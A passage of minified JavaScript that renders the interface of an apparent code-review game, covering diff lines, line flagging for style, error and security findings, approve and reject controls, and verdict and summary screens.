        </div>

        <div class="code-shell">
          <div class="code-head">
            <span>DIFF · ${o(i.path)}</span>
            <span>${e.ci} · TESTS ${o(e.tests)}</span>
          </div>
          <div class="code-scroll" tabindex="0" aria-label="Code review diff">
            <div class="code">
              ${i.lines.map((u,f)=>this.renderCodeLine(u,f,s.lineIndex,s,i)).join("")}
            </div>
          </div>
        </div>
      </section>
    `}renderCodeLine(e,t,s,i,a){const r=t===s,l=i.flags.filter(m=>m.filePath===a.path&&m.lineId===e.id),d=l.map(m=>`<span class="flag-tag ${E(m.type)}" title="${S[m.type]}">${H[m.type]}</span>`).join(""),u=e.kind==="add"?"+":e.kind==="del"?"-":" ",f=e.text.length===0?" ":he(e.text);return`
      <div
        class="code-line kind-${e.kind} ${r?"is-cursor":""} ${l.length>0?"has-flag":""}"
        data-action="select-line"
        data-line-id="${e.id}"
        role="button"
        tabindex="-1"
        aria-label="Line ${e.newNo??e.oldNo??t+1}"
      >
        <span class="cursor-mark">${r?">":" "}</span>
        <span class="line-old">${e.oldNo??""}</span>
        <span class="line-new">${e.newNo??""}</span>
        <span class="diff-mark">${u}</span>
        <span class="flag-rail">${d}</span>
        <span class="code-text">${f}</span>
      </div>
    `}renderSidebar(e){const t=this.game.state.prs[e.id];return`
      ${this.renderFindings(e,t)}
      <section class="panel side-panel meta-panel">
        <div class="panel-title">PR METADATA</div>
        <div class="meta-row"><span>AUTHOR</span><strong>${o(e.author)}</strong></div>
        <div class="meta-row"><span>TYPE</span><strong class="${e.authorKind==="agent"?"agent-text":""}">${e.authorKind==="agent"?"AUTONOMOUS AGENT":"HUMAN ENGINEER"}</strong></div>
        <div class="meta-row"><span>BRANCH</span><strong>${o(e.branch)}</strong></div>
        <div class="meta-row"><span>CI</span><strong>${o(e.ci)}</strong></div>
        <div class="meta-row"><span>TESTS</span><strong>${o(e.tests)}</strong></div>
        <p class="pr-description">${o(e.description)}</p>
      </section>

      <section class="panel side-panel actions-panel">
        <div class="panel-title">DECISION</div>
        <div class="action-grid">
          <button class="btn btn-primary" data-action="approve">
            <span class="btn-key">A</span> APPROVE
          </button>
          <button class="btn btn-danger" data-action="reject">
            <span class="btn-key">R</span> REJECT
          </button>
        </div>
        <div class="action-hint">Rejection requires at least one line finding.</div>
        <div class="action-grid secondary-actions">
          <button class="btn btn-quiet" data-action="guidelines">
            <span class="btn-key">G</span> GUIDELINES
          </button>
          <button class="btn btn-quiet" data-action="pause">
            <span class="btn-key">P</span> PAUSE
          </button>
        </div>
      </section>
    `}renderFindings(e,t){const s=t.flags.map((i,a)=>{const l=e.files.find(u=>u.path===i.filePath)?.lines.find(u=>u.id===i.lineId),d=l?.newNo??l?.oldNo??"?";return`
          <button
            class="finding-row ${E(i.type)}"
            data-action="select-line"
            data-line-id="${i.lineId}"
            title="Jump to ${o(i.filePath)}:${d}"
          >
            <span class="finding-index">${String(a+1).padStart(2,"0")}</span>
            <span class="finding-type">${S[i.type]}</span>
            <span class="finding-location">${o($(i.filePath))}:${d}</span>
          </button>
        `}).join("");return`
      <section class="panel side-panel findings-panel">
        <div class="panel-title">
          FINDINGS <span class="count-badge">${t.flags.length}</span>
        </div>
        <div class="finding-list">
          ${s.length>0?s:'<div class="empty-copy">No violations flagged. Use S / E / C on a line to cite a rule.</div>'}
        </div>
        <div class="finding-help">
          <button class="flag-action type-style" data-action="flag" data-flag-type="STYLE" title="Flag current line as a style violation">
            <kbd>S</kbd> STYLE
          </button>
          <button class="flag-action type-error" data-action="flag" data-flag-type="ERROR" title="Flag current line as an error">
            <kbd>E</kbd> ERROR
          </button>
          <button class="flag-action type-security" data-action="flag" data-flag-type="SECURITY" title="Flag current line as a security violation">
            <kbd>C</kbd> SECURITY
          </button>
          <button class="flag-action" data-action="clear-line" title="Clear findings on current line">
            <kbd>BKSP</kbd> CLEAR
          </button>
        </div>
      </section>
    `}renderEmptyReview(e){const t=this.game.pullRequests.filter(s=>e.prs[s.id].status!=="resolved");return`
      <section class="review-panel panel empty-review">
        <div class="empty-glyph">[ NO ACTIVE PULL REQUEST ]</div>
        <p>${t.length>0?`${t.length} PR${t.length===1?"":"s"} queued.`:"Queue drained. Generating report."}</p>
      </section>
    `}renderEmptySidebar(e){return`
      <section class="panel side-panel">
        <div class="panel-title">FINDINGS</div>
        <div class="empty-copy">No active review.</div>
      </section>
      <section class="panel side-panel">
        <div class="panel-title">QUEUE</div>
        <div class="empty-copy">${this.game.pullRequests.filter(t=>e.prs[t.id].status!=="resolved").length} queued.</div>
      </section>
    `}renderFooter(e){return`
      <footer class="status-bar">
        <div class="log-strip" aria-live="polite">${e.log.slice(0,3).map(s=>`
        <div class="log-line tone-${s.tone}">
          <span class="log-time">[${b(s.atMs)}]</span>
          <span>${o(s.text)}</span>
        </div>
      `).join("")}</div>
        <div class="status-hints">
          <span>↑↓ MOVE</span>
          <span>S/E/C FLAG</span>
          <span>A APPROVE</span>
          <span>R REJECT</span>
          <span>G RULES</span>
          <span>? HELP</span>
        </div>
      </footer>
    `}renderGuidelines(){const e=ue.map(s=>{const i=O.filter(a=>a.type===s);return`
        <div class="guideline-group">
          <h3 class="${E(s)}">${S[s]}</h3>
          ${i.map(a=>`
              <article class="guideline-item">
                <div class="guideline-head">
                  <span class="guideline-id ${E(s)}">${a.id}</span>
                  <strong>${o(a.title)}</strong>
                </div>
                <p>${fe(a.summary)}</p>
              </article>
            `).join("")}
        </div>
      `}).join(""),t=this.game.state.screen==="shift"?'<span class="warning-text">SHIFT TIMERS CONTINUE WHILE THIS PANEL IS OPEN</span>':"";return`
      <div class="overlay" role="dialog" aria-modal="true" aria-labelledby="guidelines-title">
        <section class="modal guidelines-modal">
          <div class="modal-head">
            <div>
              <div class="eyebrow">SOLE CORP ENGINEERING / HANDBOOK v1.0</div>
              <h2 id="guidelines-title">REVIEW GUIDELINES</h2>
            </div>
            <button class="btn btn-quiet" data-action="close-guidelines">
              <span class="btn-key">ESC</span> CLOSE
            </button>
          </div>
          <div class="guideline-grid">${e}</div>
          <div class="modal-foot">
            ${t}
            <span>Cite any line with <kbd>S</kbd> / <kbd>E</kbd> / <kbd>C</kbd>.</span>
          </div>
        </section>
      </div>
    `}renderPauseOverlay(){return`
      <div class="overlay" role="dialog" aria-modal="true" aria-labelledby="pause-title">
        <section class="modal pause-modal">
          <div class="eyebrow">SHIFT CLOCK HALTED</div>
          <h2 id="pause-title" class="pause-title">PAUSED</h2>
          <p>The queue is holding. No SLAs are draining.</p>
          <button class="btn btn-primary" data-action="resume" data-autofocus>
            <span class="btn-key">P</span> RESUME SHIFT
          </button>
        </section>
      </div>
    `}renderModal(e){const t=e.modal;if(t===null)return"";if(t.type==="confirm-approve"){const c=x[t.prId],h=c===void 0?void 0:e.prs[c.id];return c===void 0||h===void 0?"":`
        <div class="overlay" role="dialog" aria-modal="true" aria-labelledby="confirm-title">
          <section class="modal confirm-modal">
            <div class="eyebrow">MERGE OVERRIDE</div>
            <h2 id="confirm-title">UNRESOLVED FINDINGS</h2>
            <p>You have flagged <strong>${h.flags.length}</strong> violation${h.flags.length===1?"":"s"} on PR #${c.number}, but you are about to approve it.</p>
            <p class="warning-text">Approving will merge the code with your findings unresolved.</p>
            <div class="modal-actions">
              <button class="btn" data-action="dismiss-modal" data-autofocus>
                <span class="btn-key">ESC</span> CANCEL
              </button>
              <button class="btn btn-danger" data-action="confirm-approve">
                <span class="btn-key">ENTER</span> APPROVE ANYWAY
              </button>
            </div>
          </section>
        </div>
      `}if(t.type==="help")return`
        <div class="overlay" role="dialog" aria-modal="true" aria-labelledby="help-title">
          <section class="modal help-modal">
            <div class="modal-head">
              <div>
                <div class="eyebrow">REVIEWER INTERFACE</div>
                <h2 id="help-title">CONTROLS</h2>
              </div>
              <button class="btn btn-quiet" data-action="dismiss-modal" data-autofocus>
                <span class="btn-key">ESC</span> CLOSE
              </button>
            </div>
            <div class="control-grid">${M()}</div>
            <div class="modal-foot">Mouse works too: click queue tabs, file tabs, lines, and actions.</div>
          </section>
        </section>
      `;const s=t.result,i=x[s.prId];if(i===void 0)return"";const a=s.verdict==="timeout"?"AUTO-REJECTED":s.verdict.toUpperCase(),r=s.correctAction?"is-good":"is-bad",l=s.securityIncident?"SECURITY INCIDENT LOGGED":s.qualityIncident?"QUALITY INCIDENT LOGGED":"",d=s.verdict==="timeout"?"SLA EXPIRED · CODE DID NOT SHIP":s.verdict==="approved"?s.correctAction?"CLEAN MERGE":"SHIPPED WITH DEFECTS":s.correctAction?"CHANGES REQUESTED":"FALSE ALARM",u=s.caught.map(c=>this.renderDefectRow(i,c,!0)).join(""),f=s.missed.map(c=>this.renderDefectRow(i,c,!1)).join(""),m=s.falseFlags.map(c=>this.renderFalseFlag(i,c)).join("");return`
      <div class="overlay" role="dialog" aria-modal="true" aria-labelledby="verdict-title">
        <section class="modal verdict-modal">
          <div class="verdict-top">
            <div>
              <div class="eyebrow">PR #${i.number} · REVIEW RESULT</div>
              <h2 id="verdict-title">${o(i.title)}</h2>
              <p class="verdict-headline">${d}</p>
            </div>
            <div class="stamp ${r}">${a}</div>
          </div>

          <div class="verdict-stats">
            <div><span>SCORE</span><strong class="${s.scoreDelta>=0?"positive":"negative"}">${k(s.scoreDelta,!0)}</strong></div>
            <div><span>CAUGHT</span><strong>${s.caught.length}/${i.defects.length}</strong></div>
            <div><span>FALSE FLAGS</span><strong>${s.falseFlags.length}</strong></div>
            <div><span>TIME LEFT</span><strong>${b(s.remainingMs)}</strong></div>
          </div>

          ${l?`<div class="incident-banner">${l}</div>`:""}

          <div class="postmortem-grid">
            <div class="postmortem-block">
              <div class="panel-title">CAUGHT</div>
              ${u.length>0?u:'<div class="empty-copy">None.</div>'}
            </div>
            <div class="postmortem-block">
              <div class="panel-title">MISSED</div>
              ${f.length>0?f:'<div class="empty-copy">None.</div>'}
            </div>
            <div class="postmortem-block">
              <div class="panel-title">FALSE FLAGS</div>
              ${m.length>0?m:'<div class="empty-copy">None.</div>'}
            </div>
          </div>

          <div class="modal-actions">
            <button class="btn btn-primary" data-action="dismiss-modal" data-autofocus>
              <span class="btn-key">ENTER</span> ${t.final?"VIEW SHIFT REPORT":"CONTINUE QUEUE"}
            </button>
          </div>
        </section>
      </div>
    `}renderDefectRow(e,t,s){const i=this.defectLocations(e,t),a=G[t.guidelineId];return`
      <div class="defect-row ${s?"is-caught":"is-missed"}">
        <div class="defect-meta">
          <span class="guideline-id ${E(t.type)}">${t.guidelineId}</span>
          <span>${o(i)}</span>
        </div>
        <strong>${o(t.title)}</strong>
        <p>${o(t.explanation)}</p>
        ${a===void 0?"":`<span class="defect-rule">${o(a.title)}</span>`}
      </div>
    `}renderFalseFlag(e,t){const i=e.files.find(a=>a.path===t.filePath)?.lines.find(a=>a.id===t.lineId);return`
      <div class="defect-row is-false">
        <div class="defect-meta">
          <span class="guideline-id ${E(t.type)}">${S[t.type]}</span>
          <span>${o($(t.filePath))}:${i?.newNo??"?"}</span>
        </div>
        <p>No matching violation at this location.</p>
      </div>
    `}defectLocations(e,t){return t.lineIds.map(s=>{const i=e.files.find(r=>r.lines.some(l=>l.id===s)),a=i?.lines.find(r=>r.id===s);return`${$(i?.path??"?")}:${a?.newNo??"?"}`}).join(" · ")}renderSummary(){const e=this.game.state,t=re(e.score,e.metrics),s=e.results.filter(r=>r.correctAction).length,i=e.results.filter(r=>r.securityIncident||r.qualityIncident).length,a=this.game.pullRequests.map(r=>{const l=e.results.find(m=>m.prId===r.id);if(l===void 0)return"";const d=r.defects.length,u=d===0?l.verdict==="approved"?"CLEAN APPROVAL":"CLEAN PR BLOCKED":`CAUGHT ${l.caught.length}/${d} · FALSE ${l.falseFlags.length}`,f=l.correctAction?"is-good":l.verdict==="timeout"?"is-warn":"is-bad";return`
        <div class="result-row">
          <div class="result-pr">
            <span>#${r.number}</span>
            <strong>${o(r.title)}</strong>
            <small>${o(r.author)}</small>
          </div>
          <div class="result-verdict ${f}">${me(l)}</div>
          <div class="result-review">${u}</div>
          <div class="result-score ${l.scoreDelta>=0?"positive":"negative"}">${k(l.scoreDelta,!0)}</div>
        </div>
      `}).join("");return`
      <main class="summary-screen">
        <section class="summary-card panel">
          <div class="eyebrow">SHIFT 01 / COMPLETE · PERFORMANCE REVIEW</div>
          <div class="summary-hero">
            <div>
              <h1>${t.label}</h1>
              <p>${o(t.caption)}</p>
            </div>
            <div class="summary-score">
              <span>FINAL SCORE</span>
              <strong>${k(e.score,!0)}</strong>
            </div>
          </div>

          <div class="summary-metrics">
            ${R("QUALITY",e.metrics.quality)}
            ${R("SECURITY",e.metrics.security)}
            ${R("THROUGHPUT",e.metrics.throughput)}
          </div>

          <div class="summary-totals">
            <span>CORRECT DECISIONS <strong>${s}/${e.results.length}</strong></span>
            <span>INCIDENTS <strong class="${i>0?"negative":"positive"}">${i}</strong></span>
            <span>SHIFT TIME <strong>${b(e.elapsedMs)}</strong></span>
          </div>

          <div class="results-table">
            <div class="result-row result-header">
              <span>PULL REQUEST</span>
              <span>OUTCOME</span>
              <span>REVIEW QUALITY</span>
              <span>POINTS</span>
            </div>
            ${a}
          </div>

          <div class="summary-actions">
            <button class="btn btn-primary btn-large" data-action="replay" data-autofocus>
              <span class="btn-key">ENTER</span> REPLAY SHIFT
            </button>
            <span class="summary-note">The queue does not stop for you.</span>
          </div>
        </section>
      </main>
    `}tickClocks(){const e=this.game.state;if(e.screen==="shift")for(const t of this.game.pullRequests){const s=e.prs[t.id],i=this.root.querySelector(`[data-clock="${t.id}"]`),a=this.queueClock(e,t,s);i!==null&&(i.textContent=a.label,i.closest(".queue-tab")?.classList.toggle("is-critical",a.critical));const r=this.root.querySelector(`[data-sla-time="${t.id}"]`),l=this.root.querySelector(`[data-sla-block="${t.id}"]`),d=this.root.querySelector(`[data-sla-meter="${t.id}"]`);if(s.status==="available"&&r!==null&&l!==null&&d!==null){const u=L(e,t);r.textContent=b(u),l.classList.toggle("is-critical",u<=P),d.style.width=`${Math.max(0,Math.min(100,u/t.slaMs*100))}%`}}}handleClick=e=>{const t=e.target;if(!(t instanceof Element))return;const s=t.closest("[data-action]");if(s===null)return;const i=s.dataset.action;if(i!==void 0)switch(e.preventDefault(),i){case"start":this.revealCursorNext=!0,this.game.startShift();break;case"select-pr":{if(s instanceof HTMLButtonElement&&s.disabled)return;const a=s.dataset.prId;a!==void 0&&(this.revealCursorNext=!0,this.game.selectPR(a));break}case"select-file":{const a=Number(s.dataset.fileIndex);Number.isFinite(a)&&(this.revealCursorNext=!0,this.game.selectFile(a));break}case"select-line":{const a=s.dataset.lineId;a!==void 0&&this.game.selectLine(a);break}case"flag":{const a=s.dataset.flagType;(a==="STYLE"||a==="ERROR"||a==="SECURITY")&&this.game.toggleFlag(a);break}case"clear-line":this.game.clearLineFlags();break;case"approve":this.game.approve();break;case"reject":this.game.reject();break;case"confirm-approve":this.game.confirmApprove();break;case"pause":this.game.togglePause();break;case"resume":this.game.togglePause();break;case"guidelines":this.game.toggleGuidelines();break;case"close-guidelines":this.game.closeGuidelines();break;case"dismiss-modal":this.game.dismissModal();break;case"replay":this.revealCursorNext=!0,this.game.replay();break;case"help":this.game.openHelp();break}};handleKeyDown=e=>{if(e.metaKey||e.ctrlKey||e.altKey)return;const t=e.key.toLowerCase(),s=this.game.state;if(s.modal!==null){if(s.modal.type==="confirm-approve"){t==="enter"?(e.preventDefault(),this.game.confirmApprove()):t==="escape"&&(e.preventDefault(),this.game.dismissModal());return}(t==="enter"||t===" "||t==="escape")&&(e.preventDefault(),this.game.dismissModal());return}if(s.screen==="title"){if(s.guidelinesOpen){(t==="escape"||t==="g")&&(e.preventDefault(),this.game.closeGuidelines());return}t==="enter"||t===" "?(e.preventDefault(),this.revealCursorNext=!0,this.game.startShift()):t==="g"?(e.preventDefault(),this.game.toggleGuidelines()):t==="?"&&(e.preventDefault(),this.game.openHelp());return}if(s.screen==="summary"){t==="enter"||t==="r"?(e.preventDefault(),this.revealCursorNext=!0,this.game.replay()):t==="?"&&(e.preventDefault(),this.game.openHelp());return}if(s.guidelinesOpen){(t==="escape"||t==="g")&&(e.preventDefault(),this.game.closeGuidelines());return}if(s.paused){(t==="p"||t==="escape")&&(e.preventDefault(),this.game.togglePause());return}if(!(e.repeat&&(["a","r","s","e","c","g","p","?","[","]","tab"].includes(t)||/^[0-9]$/.test(t))))switch(t){case"arrowup":case"k":e.preventDefault(),this.revealCursorNext=!0,this.game.moveCursor(-1);break;case"arrowdown":case"j":e.preventDefault(),this.revealCursorNext=!0,this.game.moveCursor(1);break;case"pageup":e.preventDefault(),this.revealCursorNext=!0,this.game.moveCursor(-10);break;case"pagedown":e.preventDefault(),this.revealCursorNext=!0,this.game.moveCursor(10);break;case"home":e.preventDefault(),this.revealCursorNext=!0,this.game.jumpCursor("home");break;case"end":e.preventDefault(),this.revealCursorNext=!0,this.game.jumpCursor("end");break;case"tab":e.preventDefault(),this.revealCursorNext=!0,this.game.cyclePR(e.shiftKey?-1:1);break;case"1":case"2":case"3":case"4":case"5":case"6":case"7":case"8":case"9":case"0":{e.preventDefault();const i=t==="0"?10:Number(t),a=this.game.pullRequests[i-1];a!==void 0&&s.prs[a.id].status==="available"&&(this.revealCursorNext=!0,this.game.selectPR(a.id));break}case"[":e.preventDefault(),this.revealCursorNext=!0,this.game.cycleFile(-1);break;case"]":e.preventDefault(),this.revealCursorNext=!0,this.game.cycleFile(1);break;case"s":e.preventDefault(),this.game.toggleFlag("STYLE");break;case"e":e.preventDefault(),this.game.toggleFlag("ERROR");break;case"c":e.preventDefault(),this.game.toggleFlag("SECURITY");break;case"backspace":case"delete":e.preventDefault(),this.game.clearLineFlags();break;case"a":e.preventDefault(),this.game.approve();break;case"r":e.preventDefault(),this.game.reject();break;case"g":e.preventDefault(),this.game.toggleGuidelines();break;case"p":e.preventDefault(),this.game.togglePause();break;case"?":case"h":e.preventDefault(),this.game.openHelp();break}};handleVisibilityChange=()=>{const e=this.game.state;document.hidden&&e.screen==="shift"&&!e.paused&&e.modal===null&&this.game.togglePause()}}const q=document.querySelector("#app");if(q===null)throw new Error("Missing #app mount point");new ge(q);
